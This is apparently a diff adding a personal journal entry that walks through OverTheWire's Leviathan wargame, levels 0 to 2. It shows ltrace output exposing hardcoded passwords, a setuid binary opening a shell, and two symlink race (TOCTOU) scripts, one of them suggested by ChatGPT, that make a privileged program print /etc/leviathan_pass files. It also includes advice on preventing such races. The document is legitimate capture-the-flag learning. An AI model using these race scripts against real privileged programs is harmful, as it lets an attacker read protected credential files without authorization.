@@ -2,6 +2,380 @@
 
 Current project: [[https://github.com/rafaelbeirigo/odin-css-exercises/][Web Development Foundations Course from The Odin Project]].
 
+* [2025-10-13 Mon]
+
+Some [[https://overthewire.org/wargames/leviathan/][bit scrubbing]] today!
+
+** Intro
+
+#+begin_quote
+Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on
+
+leviathan.labs.overthewire.org through SSH on port 2223.
+
+To login to the first level use:
+
+Username: leviathan0
+Password: leviathan0
+
+Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
+#+end_quote
+
+** Functions
+
+*** Automatically assemble SSH command from given user and password (C-. C-.)
+
+#+begin_src elisp :results none
+(defun hack-ctf-overthewire-dot-org-leviathan-ssh-command
+    (arg user password)
+  "Read USER and PASSWORD then return complete ssh command.
+When ARG in non-nil do not use comman `sshpass' to automatically
+send PASSWORD to `ssh'.  Apparently the first connection must be
+established the old way."
+  (interactive
+   (list
+    current-prefix-arg
+    (read-string "user: "
+                 "leviathan" ;; challenge's prefix
+                 hack-ctf-user-history)
+    (read-string "password: " nil
+                 hack-ctf-password-history)))
+  (let* ((challenge-subdomain "leviathan")
+         (challenge-port "2223")
+         (url (concat challenge-subdomain ".labs.overthewire.org"))
+         (ssh-command (concat
+                       (unless arg (concat "sshpass -p " password " "))
+                       "ssh " url
+                       " -p " challenge-port
+                       " -l " user)))
+    (kill-new ssh-command)
+    (message "hack-ctf: ssh command copied to clipboard")
+    (sleep-for 2)
+    (if (and arg (yes-or-no-p "copy password to clipboard now?"))
+        (kill-new password))))
+(keymap-local-set "C-. C-."
+                  'hack-ctf-overthewire-dot-org-leviathan-ssh-command)
+#+end_src
+
+** 0 (I /have/ the password for leviathan0 and /want/ the one for leviathan1)
+leviathan0
+
+#+begin_example
+leviathan0@leviathan:~/.backup$ cat bookmarks.html
+#+end_example
+
+#+begin_example
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+#+end_example
+
+** 1
+
+3QJ3TgzHDq
+
+#+begin_example
+leviathan1@leviathan:~$ ll
+total 36
+drwxr-xr-x   2 root       root        4096 Aug 15 13:17 ./
+drwxr-xr-x 150 root       root        4096 Aug 15 13:18 ../
+-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root       root        3851 Aug 15 13:09 .bashrc
+-r-sr-x---   1 leviathan2 leviathan1 15084 Aug 15 13:17 check*
+-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
+#+end_example
+
+#+begin_example
+leviathan1@leviathan:~$ ltrace ./check
+__libc_start_main(0x80490ed, 1, 0xffffd464, 0 <unfinished ...>
+printf("password: ")                                                                                                                                = 10
+getchar(0, 0, 0x786573, 0x646f67password: sex
+)                                                                                                                   = 115
+getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
+getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
+strcmp("sex", "sex")                                                                                                                                = 0
+geteuid()                                                                                                                                           = 12001
+geteuid()                                                                                                                                           = 12001
+setreuid(12001, 12001)                                                                                                                              = 0
+system("/bin/sh"$
+$ cat /etc/leviathan_pass/leviathan2
+cat: /etc/leviathan_pass/leviathan2: Permission denied
+$ whoami
+leviathan1
+$ id
+uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
+$ pwd
+/home/leviathan1
+$ ./check
+password: sex
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+$ cat /etc/leviathan_pass/leviathan2
+NsN1HwFoyN
+#+end_example
+
+If I run it without ltrace, it does not drop privileges.
+
+#+begin_example
+leviathan1@leviathan:~$ ltrace ./check <------------------------------------------------------------------------------------------------------------- WITH LTRACE
+__libc_start_main(0x80490ed, 1, 0xffffd464, 0 <unfinished ...>
+printf("password: ")                                                                                                                                = 10
+getchar(0, 0, 0x786573, 0x646f67password: sex
+)                                                                                                                   = 115
+getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
+getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
+strcmp("sex", "sex")                                                                                                                                = 0
+geteuid()                                                                                                                                           = 12001
+geteuid()                                                                                                                                           = 12001
+setreuid(12001, 12001)                                                                                                                              = 0
+system("/bin/sh"$ id
+uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1) <------------------------------------------------------------------------------- DROPPED PRIVILEGES
+$ ltrace ./check
+__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
+printf("password: ")                                                                                                                                = 10
+getchar(0, 0, 0x786573, 0x646f67password: sex
+)                                                                                                                   = 115
+getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
+getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
+strcmp("sex", "sex")                                                                                                                                = 0
+geteuid()                                                                                                                                           = 12001
+geteuid()                                                                                                                                           = 12001
+setreuid(12001, 12001)                                                                                                                              = 0
+system("/bin/sh"$ id
+uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
+$ ./check
+password: sex
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+$ 
+$ 
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                              = 0
++++ exited (status 0) +++
+$ id
+uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
+$ 
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                              = 0
++++ exited (status 0) +++
+leviathan1@leviathan:~$ ./check
+password: sex
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+#+end_example
+
+** 2
+
+NsN1HwFoyN
+
+*** Poke
+
+**** Successful execution
+
+#+begin_example
+leviathan2@leviathan:~$ ltrace ./printfile .profile 
+__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
+access(".profile", 4)                                                                                                                               = 0
+snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile")                                                                                       = 17
+geteuid()                                                                                                                                           = 12002
+geteuid()                                                                                                                                           = 12002
+setreuid(12002, 12002)                                                                                                                              = 0
+system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+        . "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                              = 0
++++ exited (status 0) +++
+#+end_example
+
+**** Order of tests and calls
+
+Previous one:
+
+#+begin_example
+strcmp("sex", "sex")                                                                                                                                = 0
+geteuid()                                                                                                                                           = 12001
+geteuid()                                                                                                                                           = 12001
+setreuid(12001, 12001)                                                                                                                              = 0
+system("/bin/sh"$ id
+#+end_example
+
+This one:
+
+#+begin_example
+access(".profile", 4)                                                                                                                               = 0
+snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile")                                                                                       = 17
+geteuid()                                                                                                                                           = 12002
+geteuid()                                                                                                                                           = 12002
+setreuid(12002, 12002)                                                                                                                              = 0
+system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
+#+end_example
+
+*** DONE Does it print the password file without tracing?  No
+
+#+begin_example
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3 
+You cant have that file...
+#+end_example
+
+*** DONE Does it get ~cat~ from PATH?  No
+
+#+begin_example
+leviathan2@leviathan:~$ export PATH=""
+leviathan2@leviathan:~$ ./printfile .profile 
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+        . "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+#+end_example
+*** DONE Printar link mutante.  SOLVED
+#+begin_example
+#!/bin/bash
+
+
+LEV=/etc/leviathan_pass/leviathan
+LEV2=${LEV}2
+LEV3=${LEV}3
+L=/tmp/chaves-L
+PRINTFILE=/home/leviathan2/printfile
+
+ln -sf $LEV2 $L
+$PRINTFILE $L &
+ln -sf $LEV3
+#+end_example
+
+#+begin_example
+leviathan2@leviathan:~$ vi /tmp/chaves.sh
+
+---
+
+#!/bin/bash
+
+ln -sf /etc/leviathan_pass/leviathan2 /tmp/chaves-L
+/home/leviathan2/printfile /tmp/chaves-L &
+ln -sf /etc/leviathan_pass/leviathan3 /tmp/chaves-L
+
+---
+
+leviathan2@leviathan:~$ /tmp/chaves.sh
+leviathan2@leviathan:~$ f0n8h2iWLP
+#+end_example
+*** ChatGPT comments
+
+[[https://chatgpt.com/share/68ed9138-3f28-8006-ac1e-835908865878][ChatGPT]]
+
+**** More robust TOCTOU script
+
+#+begin_example
+#!/bin/bash
+# deterministic TOCTOU flipper for CTF practice only
+
+GOOD="/home/leviathan2/.profile"   # a file RUID can read (replace with real file)
+SECRET="/etc/leviathan_pass/leviathan3" # the secret you want printed
+LINK="/tmp/chaves-L"
+BINARY="/home/leviathan2/printfile"     # the setuid binary that does: check ACCESS then exec cat LINK
+
+# make sure the link starts pointing to the readable file
+ln -sf "$GOOD" "$LINK"
+
+# start the target program in the background and capture its PID
+"$BINARY" "$LINK" &
+TARGET_PID=$!
+
+# while the target is still alive, keep flipping the symlink
+while kill -0 "$TARGET_PID" 2>/dev/null; do
+  ln -sf "$GOOD" "$LINK"
+  ln -sf "$SECRET" "$LINK"
+done
+
+# wait for the target to finish and print exit status
+wait "$TARGET_PID"
+echo "target exited with $?"
+#+end_example
+
+
+#+begin_example
+leviathan2@leviathan:~$ /tmp/chaves.sh
+f0n8h2iWLP
+target exited with 0
+#+end_example
+
+**** Correct program design (how this should be prevented)
+
+A secure program that needs to both check a user’s rights and open/use a file under another UID must avoid TOCTOU by not using separate pathname checks. Secure patterns include:
+
+Open then verify using the opened descriptor
+
+fd = open(path, O_RDONLY|O_NOFOLLOW);
+
+fstat(fd, &st); Verify ownership/permissions on fd (not on path). Use fchmod/fchown/check st fields as needed. Because operations act on the already-opened descriptor, the target cannot be swapped by a symlink after open.
+
+Use file-descriptor-based operations instead of re-resolving the pathname later (fexecve / run with fd or read from fd directly). That prevents lookup at time-of-use.
+
+Avoid access() for security checks, because it checks current real/effective permissions against the filename and is vulnerable to TOCTOU. If the program needs to verify permissions, open the file (with the minimum privileges) and operate on the returned descriptor.
+
+Drop privileges safely: if the program must switch to EUID to read something privileged, handle UID transitions carefully:
+
+Temporarily set effective UID to the one that should do the check, open/lock the file descriptor, then set EUID to the other identity and use the already-open FD.
+
+Use O_NOFOLLOW to prevent symlink abuse where appropriate.
+
+Use kernel-level protections if available: openat2() with RESOLVE_NO_SYMLINKS (newer kernels) or seccomp / file capabilities to narrow attack surface.
+
+In short: do the check and the use on the same resolved kernel object (the same FD), and do not re-resolve the pathname.
+
+** 3
+
+f0n8h2iWLP
+
 * [2025-10-12 Sun]
 
 Today I used a good part of the sunny Sunday to do something I have been wanting to do for years: reset Org Mode font colors; it is /too/ colorful!
